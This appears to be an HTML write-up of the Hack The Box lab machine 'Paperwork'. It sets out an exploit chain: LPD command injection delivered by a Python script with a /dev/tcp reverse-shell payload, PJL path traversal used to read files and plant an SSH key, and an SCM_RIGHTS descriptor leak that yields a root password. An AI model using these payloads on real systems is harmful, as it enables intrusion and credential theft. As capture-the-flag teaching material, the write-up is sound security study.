@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paperwork — HTB Writeup</title>
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="stylesheet" href="/inter-font.css">
+    <link rel="stylesheet" href="/fontawesome.css">
+    <link rel="stylesheet" href="writeup.css">
+</head>
+<body>
+
+    <nav class="nav">
+        <a href="/htb/" class="nav-back"><i class="fas fa-arrow-left"></i> Writeups</a>
+        <span class="nav-title">Paperwork</span>
+        <span></span>
+    </nav>
+
+    <div class="writeup-page" id="page" style="display:none">
+
+        <header class="writeup-header">
+            <div class="wh-meta">
+                <span class="wr-tag machine">Machine</span>
+                <span class="wr-tag hard">Hard</span>
+                <span class="wr-os"><i class="fab fa-linux"></i> Linux</span>
+            </div>
+            <h1 class="wh-title">Paperwork</h1>
+            <p class="wh-summary">Three custom services, three bugs: command injection in a homebrew LPD server → path traversal in a PJL printer emulator → a security daemon that leaks its own root-held file descriptor to the attacker via <code>SCM_RIGHTS</code>.</p>
+        </header>
+
+        <article class="writeup-body">
+
+            <section class="wb-section">
+                <h2>Attack Chain Overview</h2>
+                <div class="chain-table">
+                    <div class="chain-row">
+                        <span class="chain-stage">Foothold</span>
+                        <span class="chain-desc">Unsanitized <code>J</code> field in RFC 1179 control file → <code>shell=True</code> injection in homebrew LPD server → shell as <code>lp</code></span>
+                    </div>
+                    <div class="chain-row">
+                        <span class="chain-stage">User</span>
+                        <span class="chain-desc">PJL <code>FSUPLOAD</code>/<code>FSDOWNLOAD</code> with <code>../</code> traversal in JetDirect emulator → arbitrary read/write as <code>archivist</code> → SSH key plant → shell</span>
+                    </div>
+                    <div class="chain-row">
+                        <span class="chain-stage">Root</span>
+                        <span class="chain-desc"><code>paperwork-daemon</code> holds <code>admin_pins.conf</code> fd open as root; passes it to any connecting socket via <code>SCM_RIGHTS</code> on security alert → credential leak → <code>su root</code></span>
+                    </div>
+                </div>
+            </section>
+
+            <section class="wb-section">
+                <h2>1. Reconnaissance</h2>
+                <p>Initial scan shows two services. Nginx returns a 301 with no body until the correct <code>Host</code> header is supplied — add <code>paperwork.htb</code> to <code>/etc/hosts</code>:</p>
+                <pre><code>nmap -sV 10.129.36.22</code></pre>
+                <pre><code>22/tcp open  ssh   OpenSSH 10.0p2 Ubuntu
+80/tcp open  http  nginx 1.28.0 (Ubuntu)</code></pre>
+                <p>A full port sweep turns up a third service the default top-1000 scan missed:</p>
+                <pre><code>nmap -p- -sV -T4 10.129.36.22</code></pre>
+                <pre><code>22/tcp   open  ssh
+80/tcp   open  http
+1515/tcp open  ifor-protocol?</code></pre>
+                <p>Nmap can't fingerprint 1515 but grabs a banner: <code>Archive_Printer is ready and printing.</code></p>
+
+                <h3>Web page</h3>
+                <p><code>paperwork.htb</code> serves a static "Intake Portal" for an internal document archiving system. An info table reveals the key details: protocol is <strong>RFC 1179</strong> (Line Printer Daemon), target queue is <code>archive_intake</code>, and there's a download link for <code>paperwork-archive-v1.02</code>. RFC 1179's classic port is 515 — the service was moved to 1515, matching the mystery port.</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>2. Foothold: Command Injection in the LPD Server</h2>
+                <p>The archive download is a zip despite lacking the extension:</p>
+                <pre><code>file archive
+# archive: Zip archive data, made by v3.0 UNIX, method=deflate</code></pre>
+                <p>Extracting reveals <code>server.py</code> — the actual LPD service. The vulnerable section:</p>
+                <pre><code>job_name = "Unknown"
+for line in decoded_content.split('\n'):
+    line = line.strip()
+    if line.startswith('J'):
+        job_name = line[1:]
+        break
+
+subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)</code></pre>
+                <p><code>job_name</code> is pulled straight from the client-supplied <code>J</code> line in the RFC 1179 control file with no sanitization, then dropped into an f-string executed with <code>shell=True</code>. A single quote breaks out of <code>'Archive: ...'</code> and anything after runs as a separate shell command.</p>
+
+                <h3>Protocol flow (reversed from the source)</h3>
+                <ol>
+                    <li>Send <code>\x02</code> + queue name + <code>\n</code> to open a job against <code>archive_intake</code>.</li>
+                    <li>Send subcommand byte + <code>"&lt;size&gt; &lt;filename&gt;\n"</code> — size must match the exact byte length of what follows.</li>
+                    <li>Server acks with <code>\x00</code>.</li>
+                    <li>Send the control file content with the <code>J</code> line carrying the injection.</li>
+                    <li>Server executes the vulnerable <code>Popen</code> call.</li>
+                </ol>
+
+                <pre><code>#!/usr/bin/env python3
+import socket
+
+TARGET, PORT, QUEUE = "10.129.36.22", 1515, "archive_intake"
+LHOST, LPORT = "10.10.14.7", 4444
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TARGET, PORT))
+s.send(bytes([2]) + QUEUE.encode() + b"\n")
+
+payload = f"'; bash -c \"bash -i >&/dev/tcp/{LHOST}/{LPORT} 0>&1\" ; echo '"
+control_content = f"Hattacker\nProot\nJ{payload}\n".encode()
+
+s.send(bytes([2]) + f"{len(control_content)} cfA001kali\n".encode())
+s.recv(1)
+s.send(control_content)
+s.recv(1); s.recv(1)
+s.close()</code></pre>
+                <p>Listener catches a shell as <code>lp</code>.</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>3. Lateral Movement: PJL Path Traversal → archivist</h2>
+                <p><code>ps aux</code> reveals the internal landscape:</p>
+                <pre><code>archivi+  986  ... /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ ...
+lp        989  ... /usr/bin/python3 /opt/LPDServer/server.py
+root      971  ... /usr/bin/python3 /root/staging/CorpoSite/app.py
+root     1463  ... /usr/bin/python3 /usr/bin/paperwork-daemon</code></pre>
+                <p><code>archivist</code> is running a JetDirect printer emulator on port 9100, bound to loopback only. JetDirect almost always speaks PJL underneath, and homebrew PJL implementations have a long history of doing filesystem operations (<code>FSUPLOAD</code>, <code>FSDOWNLOAD</code>, <code>FSDIRLIST</code>) without sandboxing them.</p>
+
+                <p>Connecting to 9100 and sending <code>@PJL INFO ID</code> returns <code>HP LASERJET 4ML</code>. Listing the printer's virtual root:</p>
+                <pre><code>@PJL FSDIRLIST NAME="0:\"</code></pre>
+                <pre><code>. TYPE=DIR
+.. TYPE=DIR
+logs TYPE=DIR SIZE=4096
+jetdirect.py TYPE=FILE SIZE=5119</code></pre>
+
+                <p>The service reads files as <code>archivist</code>, so <code>FSUPLOAD</code> retrieves <code>jetdirect.py</code> even though <code>lp</code> can't read <code>/home/archivist/printer/</code> directly. The vulnerable path translator in the recovered source:</p>
+                <pre><code>def _translate(self, path):
+    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
+    return os.path.normpath(os.path.join(self._root, clean))</code></pre>
+                <p><code>0:</code> gets stripped, backslashes become forward slashes, then joined with root and normalized — but nothing strips <code>../</code>. <code>os.path.normpath</code> resolves <code>printer/../user.txt</code> straight to <code>/home/archivist/user.txt</code>.</p>
+
+                <h3>Read user.txt</h3>
+                <pre><code>@PJL FSUPLOAD NAME="0:\..\.user.txt"</code></pre>
+
+                <h3>Write SSH key for persistent access</h3>
+                <p><code>FSDOWNLOAD</code> uses the same <code>_translate</code> function plus <code>os.makedirs(..., exist_ok=True)</code>, giving arbitrary write as <code>archivist</code>:</p>
+                <pre><code>PUBKEY = b"ssh-ed25519 AAAA... cenchss@kali\n"
+cmd = (b'\x1b%-12345X@PJL FSDOWNLOAD NAME="0:\\..\\.ssh\\authorized_keys" SIZE='
+       + str(len(PUBKEY)).encode() + b'\r\n' + PUBKEY + b'\x1b%-12345X\r\n')</code></pre>
+                <pre><code>ssh -i ./archivist_key archivist@paperwork.htb</code></pre>
+            </section>
+
+            <section class="wb-section">
+                <h2>4. Privilege Escalation: SCM_RIGHTS File Descriptor Leak</h2>
+                <p>No <code>sudo</code>, no exploitable SUID binaries, nothing in capabilities. <code>paperwork-daemon</code> is the only root-owned custom process left. Recovering its source:</p>
+                <pre><code># Opens the credential file at startup — holds the fd for the life of the process
+admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
+
+def scan_for_malice():
+    with open(LOG_PATH, 'r') as f:
+        content = f.read().upper()
+        if any(t in content for t in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
+            return True
+    return False
+
+def trigger_lockdown(conn):
+    log_fd = os.open(LOG_PATH, os.O_RDONLY)
+    evidence_bundle = array.array("i", [log_fd, admin_fd])
+    conn.sendmsg([b"ALERT: SECURITY_VIOLATION..."],
+                 [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])</code></pre>
+
+                <p>The daemon opens <code>/etc/paperwork/admin_pins.conf</code> as root at startup and holds the descriptor. It listens on a Unix domain socket at <code>/run/paperwork/mgmt.sock</code> — <code>chmod 0660</code>, group-owned by <code>archivist</code>'s gid — so any connection from <code>archivist</code> is permitted.</p>
+
+                <p>The design flaw: when the printer log contains PJL filesystem commands (which it already did from the previous traversal exploit), the daemon treats this as an intrusion and sends "forensic evidence" to whoever's connected — by passing the actual open file descriptors via <code>SCM_RIGHTS</code>. <code>SCM_RIGHTS</code> duplicates the fd into the receiving process with the same access the sender had. The OS does not re-check permissions afterward. It doesn't matter who's on the other end of the socket.</p>
+
+                <p>The trigger condition was already satisfied. Connect and catch the passed descriptors:</p>
+                <pre><code>import socket, array, os
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect("/run/paperwork/mgmt.sock")
+
+fds = array.array("i")
+msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(2 * 4))
+
+for level, cmsg_type, data in ancdata:
+    if level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
+        fds.frombytes(data[:len(data) - (len(data) % fds.itemsize)])
+
+for fd in fds:
+    print(os.pread(fd, 4096, 0).decode(errors="ignore"))</code></pre>
+
+                <p>Two descriptors come back — one for the log, one for <code>admin_pins.conf</code>:</p>
+                <pre><code>ADMIN_PASSWORD=ApparelMortuaryCedar22</code></pre>
+                <p>The password doubles as root's system password:</p>
+                <pre><code>su root</code></pre>
+            </section>
+
+            <section class="wb-section">
+                <h2>Notes</h2>
+                <p>The daemon is a genuinely interesting design mistake — it's not that the monitoring logic is wrong, it's that "send the evidence to the connecting socket" and "the connecting socket might be the attacker" were never reconciled. Detecting misuse of a tool and then handing a root-held file descriptor to whoever triggered the detection is backwards; the alert channel needed to go somewhere the attacker couldn't also be listening.</p>
+                <p>The <code>shell=True</code> injection in the LPD server is the more familiar bug, but legacy protocols like RFC 1179 are still lying around on internal networks precisely because nobody expects them to still be running — that's what made the whole chain plausible as a "corporate intranet" scenario.</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>Flags</h2>
+                <div class="flag-grid">
+                    <div class="flag-item">
+                        <span class="flag-label">User</span>
+                        <code class="flag-val">user.txt obtained ✓</code>
+                    </div>
+                    <div class="flag-item">
+                        <span class="flag-label">Root</span>
+                        <code class="flag-val">root.txt obtained ✓</code>
+                    </div>
+                </div>
+            </section>
+
+        </article>
+    </div>
+
+    <script>
+    const SESSION_KEY = 'htb_auth';
+    if (!sessionStorage.getItem(SESSION_KEY)) {
+        window.location.href = '/htb/';
+    } else {
+        document.getElementById('page').style.display = 'block';
+    }
+    </script>
+
+</body>
+</html>
